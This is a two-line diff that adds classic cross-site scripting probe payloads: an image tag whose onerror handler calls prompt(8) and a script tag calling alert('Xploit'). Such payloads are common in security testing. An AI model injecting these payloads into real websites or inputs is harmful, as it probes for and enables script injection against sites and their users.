@@ -1,0 +1,2 @@
+<image/src/onerror=prompt(8)>
+<script>alert("Xploit")</script>
